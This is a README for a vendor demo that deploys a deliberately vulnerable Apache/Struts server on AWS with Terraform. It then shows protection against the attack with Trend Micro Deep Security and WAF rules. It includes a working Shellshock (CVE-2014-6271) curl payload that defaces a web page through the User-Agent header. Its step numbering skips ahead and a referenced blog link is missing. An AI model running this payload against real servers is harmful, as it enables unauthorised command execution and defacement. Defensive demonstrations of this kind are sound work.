##Overview
This demo is created to exploit apache shellshock vulnerability with docker container. It will deploy vulnerable struts version with sample demo application on AWS.
Demo is created for 3 AWS regions (Ohio, Oregon, Ireland) with default Ohio region setup. AMI images used in Demo is available in these 3 regions as public AMIs.
In order to setup the environment few hardcoded modifications need to be done on terraform code.

 
##Pre-requisites:
- AWS IAM account with administrator access
- Terraform need to be deployed on user's system with basic configuration
- if you are setting uo victim outside AWS then you can use following blog post for victim setup.

NOTE: if in case tomcat service is not started. you can login to EC2 instance and start the same using "#sudo $CATALINA_HOME/bin/startup.sh"

##Hardcoded modifications
- user_data.sh is a bootstrap script which can be modify to add Trend Micro DS agent configuration  
- EC2 Keys are stored in /Scripts directory. you can use the .pem or .ppk to login to EC2 instance over the internet.

##Generic steps for victim setup:
#step 1
Deploy terraform template on AWS using terraform plan and terraform apply.
# terraform init
# terraform apply

#2
Victim domain name will be available in terraform apply output. we have to use the same during our attack 
We have configured proxy with ELB to convert port 8080 to 80.  

#3
Application URL is configured with 8080 which is being proxied using loadbalancer


##Exploit demo execution steps:
#Step 1:Open bash shell and enter following command to exploit vulnerability

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://shellshock.bryceindustries.net:80/cgi-bin/vulnerable



#step 6: SSH to public ip of victim server and show the affected file
## curl http://shellshock.bryceindustries.net:80
## Open url in browser for the demo


#step 7: add shellshok all rules in the policy (search rule using cve-2014-6271)

Complete!!!.. now show the protection with Deep security and/or Trend Micro managed WAF rules. 

---------------------------Protection with Trendmicro managed WAF rules or with DS---------

NOW, Login to AWS deep security portal and WAF rule 
-> select Trendmicro-Managed-Rule-ACL
-> select rules tab in right side
-> edit ACL and select Trendmicro managed WAF rule (Apache and Ngnix)
-> now run the exploit again. it should fail